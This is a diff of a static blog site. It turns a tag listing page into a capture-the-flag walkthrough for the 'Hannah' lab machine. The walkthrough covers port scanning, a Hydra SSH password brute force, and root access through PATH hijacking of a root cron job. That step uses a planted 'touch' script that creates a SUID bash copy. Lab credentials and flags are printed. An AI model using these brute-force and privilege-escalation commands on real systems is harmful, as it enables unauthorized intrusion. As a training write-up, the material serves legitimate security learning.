@@ -3,22 +3,22 @@
 <meta http-equiv="content-type" content="text/html">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title itemprop="name">Privilege-Escalation | Null Blog</title>
-<meta property="og:title" content="Privilege-Escalation | Null Blog" />
-<meta name="twitter:title" content="Privilege-Escalation | Null Blog" />
-<meta itemprop="name" content="Privilege-Escalation | Null Blog" />
-<meta name="application-name" content="Privilege-Escalation | Null Blog" />
+<title itemprop="name">Hannah - Walkthrough | Null Blog</title>
+<meta property="og:title" content="Hannah - Walkthrough | Null Blog" />
+<meta name="twitter:title" content="Hannah - Walkthrough | Null Blog" />
+<meta itemprop="name" content="Hannah - Walkthrough | Null Blog" />
+<meta name="application-name" content="Hannah - Walkthrough | Null Blog" />
 <meta property="og:site_name" content="Null Blog" />
 
-<meta name="description" content="CTF writeups, hacking notes, and walkthroughs.">
-<meta itemprop="description" content="CTF writeups, hacking notes, and walkthroughs." />
-<meta property="og:description" content="CTF writeups, hacking notes, and walkthroughs." />
-<meta name="twitter:description" content="CTF writeups, hacking notes, and walkthroughs." />
+<meta name="description" content="Walkthrough for the Hannah machine.">
+<meta itemprop="description" content="Walkthrough for the Hannah machine." />
+<meta property="og:description" content="Walkthrough for the Hannah machine." />
+<meta name="twitter:description" content="Walkthrough for the Hannah machine." />
 
 <meta property="og:locale" content="en-US" />
 <meta name="language" content="en-US" />
 
-  <link rel="alternate" hreflang="en" href="https://nvru.github.io/tags/privilege-escalation/" title="" />
+  <link rel="alternate" hreflang="en" href="https://nvru.github.io/walkthrough/hmv/hannah/" title="" />
 
 
 
@@ -28,26 +28,33 @@
 <meta name="generator" content="Hugo 0.164.0">
 
     
-    <meta property="og:url" content="https://nvru.github.io/tags/privilege-escalation/">
+    <meta property="og:url" content="https://nvru.github.io/walkthrough/hmv/hannah/">
 	<meta property="og:site_name" content="Null Blog">
-	<meta property="og:title" content="Privilege-Escalation">
-	<meta property="og:description" content="CTF writeups, hacking notes, and walkthroughs.">
+	<meta property="og:title" content="Hannah - Walkthrough">
+	<meta property="og:description" content="Walkthrough for the Hannah machine.">
 	<meta property="og:locale" content="en_US">
-	<meta property="og:type" content="website">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="walkthrough">
+		<meta property="article:published_time" content="2026-07-15T00:00:00+00:00">
+		<meta property="article:modified_time" content="2026-07-15T00:00:00+00:00">
+		<meta property="article:tag" content="Ctf">
+		<meta property="article:tag" content="Walkthrough">
+		<meta property="article:tag" content="Linux">
+		<meta property="article:tag" content="Nginx">
+		<meta property="article:tag" content="Cron">
+		<meta property="article:tag" content="Path-Hijacking">
 
 
     
     
 	<meta name="twitter:card" content="summary">
-	<meta name="twitter:title" content="Privilege-Escalation">
-	<meta name="twitter:description" content="CTF writeups, hacking notes, and walkthroughs.">
+	<meta name="twitter:title" content="Hannah - Walkthrough">
+	<meta name="twitter:description" content="Walkthrough for the Hannah machine.">
 
 
     
 
-    <link rel="canonical" href="https://nvru.github.io/tags/privilege-escalation/">
-    <link href="/tags/privilege-escalation/index.xml" rel="alternate" type="application/rss+xml" title="Null Blog">
-    <link href="/tags/privilege-escalation/index.xml" rel="feed" type="application/rss+xml" title="Null Blog">
+    <link rel="canonical" href="https://nvru.github.io/walkthrough/hmv/hannah/">
     <link href="/style.min.2d921c18cf1ec555ffc03d59a8adc211c402c68c930c27d6a0c306ab175a8d09.css" rel="stylesheet">
     <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
 
@@ -109,7 +116,7 @@ stroke-linejoin="round" class="feather feather-home">
                 </li>
                 
                 <li>
-                    <a class="menu-link " href="/walkthrough/">
+                    <a class="menu-link active" href="/walkthrough/">
                         Walkthroughs
                     </a>
                     
@@ -165,311 +172,169 @@ stroke-linejoin="round" class="feather feather-home">
         </div>
     </nav>
 </div>
-<div class="wrapper list-page">
-    <header class="header">
-        <h1 class="header-title center">Privilege-Escalation</h1>
-    </header>
+
+<div class="wrapper post">
     <main class="page-content" aria-label="Content">
-        
-        
-        <h2 class="post-year">2026</h2>
+        <article>
+            <header class="header">
+                <h1 class="header-title">Hannah - Walkthrough</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2026-07-15T00:00:00&#43;00:00" itemprop="datePublished"> 15 Jul 2026 </time>
+                </div>
+                
+            </header>
+            
+    
+    <details class="toc" ZgotmplZ>
+        <summary><b>Table of Contents</b></summary>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#rustscan">RustScan</a></li>
+    <li><a href="#results">Results</a></li>
+  </ul>
 
-        
+  <ul>
+    <li><a href="#http">HTTP</a></li>
+    <li><a href="#robotstxt">robots.txt</a></li>
+    <li><a href="#directory-enumeration">Directory Enumeration</a></li>
+  </ul>
 
-        
+  <ul>
+    <li><a href="#ssh-brute-force">SSH Brute Force</a></li>
+  </ul>
 
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/hannah/">Hannah - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-15T00:00:00Z">
-        15 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/printer2/">Printer2 - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-14T00:00:00Z">
-        14 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/printer/">Printer - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-13T00:00:00Z">
-        13 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/htb/cctv/">CCTV - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-12T00:00:00Z">
-        12 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/pingme/">Pingme - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-11T00:00:00Z">
-        11 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/immortal/">Immortal - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-10T00:00:00Z">
-        10 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/yuan113/">Yuan113 - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-09T00:00:00Z">
-        9 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/yuan112/">Yuan112 - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-09T00:00:00Z">
-        9 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/yuan111/">Yuan111 - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-09T00:00:00Z">
-        9 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/yuan114/">Yuan114 - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-08T00:00:00Z">
-        8 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/jabita/">Jabita - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-07T00:00:00Z">
-        7 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/translator/">Translator - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-06T00:00:00Z">
-        6 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/find/">Find - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-06T00:00:00Z">
-        6 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/helix/">Helix - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-05T00:00:00Z">
-        5 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/suidy/">The Suidy - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-04T00:00:00Z">
-        4 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/phantom/">Phantom - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-03T00:00:00Z">
-        3 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/darkside/">The DarkSide - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-01T00:00:00Z">
-        1 Jul 2026
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/bonjur/">Bonjur - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-01T00:00:00Z">
-        1 Jul 2026
-    </time>
-</article>
-
-
-         
-
-         
-
-    </main>
-</div><footer class="footer">
+  <ul>
+    <li><a href="#enumeration-1">Enumeration</a>
+      <ul>
+        <li><a href="#opt">/opt</a></li>
+        <li><a href="#web-directory">Web Directory</a></li>
+        <li><a href="#user-cron-jobs">User Cron Jobs</a></li>
+      </ul>
+    </li>
+    <li><a href="#root-cron-job">Root Cron Job</a></li>
+    <li><a href="#path-hijacking">PATH Hijacking</a></li>
+  </ul>
+</nav>
+    </details>
+            <div class="page-content">
+                <h1 id="overview">Overview</h1>
+<ul>
+<li><strong>Attacker IP:</strong> <code>10.10.10.2</code></li>
+<li><strong>Target Machine IP:</strong> <code>10.10.10.24</code></li>
+</ul>
+<p>The objective was to enumerate the target, identify exposed services, gain initial access through SSH credential brute forcing, and escalate privileges by abusing an insecure <code>PATH</code> configuration in a root cron job.</p>
+<p><img src="/images/hmv/hannah/vm.png" alt="Machine information"></p>
+<hr>
+<h1 id="port-scanning">Port Scanning</h1>
+<h2 id="rustscan">RustScan</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rustscan -a 10.10.10.24 -- -sC -sV -A -oA nmap/rust
+</span></span></code></pre></div><h2 id="results">Results</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>PORT    STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1
+</span></span><span style="display:flex;"><span>80/tcp  open  http    nginx 1.18.0
+</span></span><span style="display:flex;"><span>113/tcp open  ident
+</span></span></code></pre></div><p>Only three ports were exposed:</p>
+<ul>
+<li><strong>22</strong> - SSH</li>
+<li><strong>80</strong> - HTTP (nginx)</li>
+<li><strong>113</strong> - Ident</li>
+</ul>
+<p>SSH immediately became an interesting target because Nmap revealed the username <strong>moksha</strong> as the owner of the HTTP service.</p>
+<hr>
+<h1 id="enumeration">Enumeration</h1>
+<h2 id="http">HTTP</h2>
+<p>Browsing to the web server only displayed a simple <strong>&ldquo;Under construction&rdquo;</strong> page.</p>
+<p>There was nothing useful in the page source.</p>
+<p><img src="/images/hmv/hannah/http.png" alt="Website"></p>
+<hr>
+<h2 id="robotstxt">robots.txt</h2>
+<p>Checking <code>robots.txt</code> revealed an interesting entry.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>/enlightenment
+</span></span></code></pre></div><p><img src="/images/hmv/hannah/robots.png" alt="robots"></p>
+<p>Unfortunately, visiting the directory only resulted in a <strong>404 Not Found</strong> page.</p>
+<p><img src="/images/hmv/hannah/404.png" alt="404"></p>
+<p>Since nothing useful was available through the website, I continued with further enumeration.</p>
+<hr>
+<h2 id="directory-enumeration">Directory Enumeration</h2>
+<p>Directory brute forcing did not reveal any additional content.</p>
+<p>Because Nmap had already disclosed the username <strong>moksha</strong>, I decided to attempt password brute forcing against SSH instead.</p>
+<hr>
+<h1 id="initial-access">Initial Access</h1>
+<h2 id="ssh-brute-force">SSH Brute Force</h2>
+<p>Using Hydra:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -l moksha -P /opt/wordlists/rockyou-75.txt ssh://10.10.10.24
+</span></span></code></pre></div><p>Hydra successfully recovered the credentials:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Username: moksha
+</span></span><span style="display:flex;"><span>Password: hannah
+</span></span></code></pre></div><p><img src="/images/hmv/hannah/brute.png" alt="Hydra"></p>
+<p>Using the recovered credentials, SSH authentication succeeded.</p>
+<p><img src="/images/hmv/hannah/ssh_moksha.png" alt="SSH Login"></p>
+<hr>
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<h2 id="enumeration-1">Enumeration</h2>
+<p>The first thing I checked was whether sudo was installed.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -l
+</span></span></code></pre></div><p>However, <code>sudo</code> was not installed.</p>
+<p><img src="/images/hmv/hannah/sudo.png" alt="sudo"></p>
+<p>I also checked whether the system used <strong>doas</strong> instead.</p>
+<p>Unfortunately, it was not available either.</p>
+<p><img src="/images/hmv/hannah/doas_path.png" alt="doas"></p>
+<p>I continued searching for common privilege escalation vectors.</p>
+<h3 id="opt">/opt</h3>
+<p>Nothing interesting was found.</p>
+<p><img src="/images/hmv/hannah/opt.png" alt="opt"></p>
+<h3 id="web-directory">Web Directory</h3>
+<p>The web directory also contained nothing useful.</p>
+<p><img src="/images/hmv/hannah/web.png" alt="web"></p>
+<h3 id="user-cron-jobs">User Cron Jobs</h3>
+<p>The <strong>moksha</strong> user had no cron jobs configured.</p>
+<p><img src="/images/hmv/hannah/moksha_cron.png" alt="moksha cron"></p>
+<hr>
+<h2 id="root-cron-job">Root Cron Job</h2>
+<p>Checking root&rsquo;s cron jobs revealed something much more interesting.</p>
+<p>Root periodically executed:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>touch /tmp/enlIghtenment
+</span></span></code></pre></div><p><img src="/images/hmv/hannah/root_cron.png" alt="Root Cron"></p>
+<p>While inspecting the environment, I noticed that <code>/media</code> was included in the system <code>PATH</code>.</p>
+<p>Even more importantly, <code>/media</code> was <strong>world writable</strong>, allowing any user to create executable files there.</p>
+<p><img src="/images/hmv/hannah/media_perm.png" alt="Media Permissions"></p>
+<p>This opened the door for a classic <strong>PATH hijacking</strong> attack.</p>
+<hr>
+<h2 id="path-hijacking">PATH Hijacking</h2>
+<p>I created a malicious executable named <code>touch</code> inside <code>/media</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env bash
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cp /bin/bash /tmp/shell
+</span></span><span style="display:flex;"><span>chmod u+s /tmp/shell
+</span></span></code></pre></div><p>After creating the file, I made it executable.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chmod <span style="color:#ae81ff">777</span> /media/touch
+</span></span></code></pre></div><blockquote>
+<p>The <code>777</code> permissions are excessive but acceptable for this CTF demonstration.</p>
+</blockquote>
+<p>To monitor the attack, I watched the <code>/tmp</code> directory.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>watch ls -la /tmp/
+</span></span></code></pre></div><p>Eventually, the root cron job executed my malicious <code>touch</code> binary instead of the legitimate system binary.</p>
+<p>A SUID bash shell was created.</p>
+<p>Running:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/tmp/shell -p
+</span></span></code></pre></div><p>provided a root shell.</p>
+<p><img src="/images/hmv/hannah/root.png" alt="Root Shell"></p>
+<hr>
+<h1 id="credentials">Credentials</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>moksha:hannah
+</span></span></code></pre></div><hr>
+<h1 id="flags">Flags</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>user:HMVGGHFWP2023
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root:HMVHAPPYNY2023
+</span></span></code></pre></div>
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
     <span class="footer_item"> </span>
     &nbsp;
 
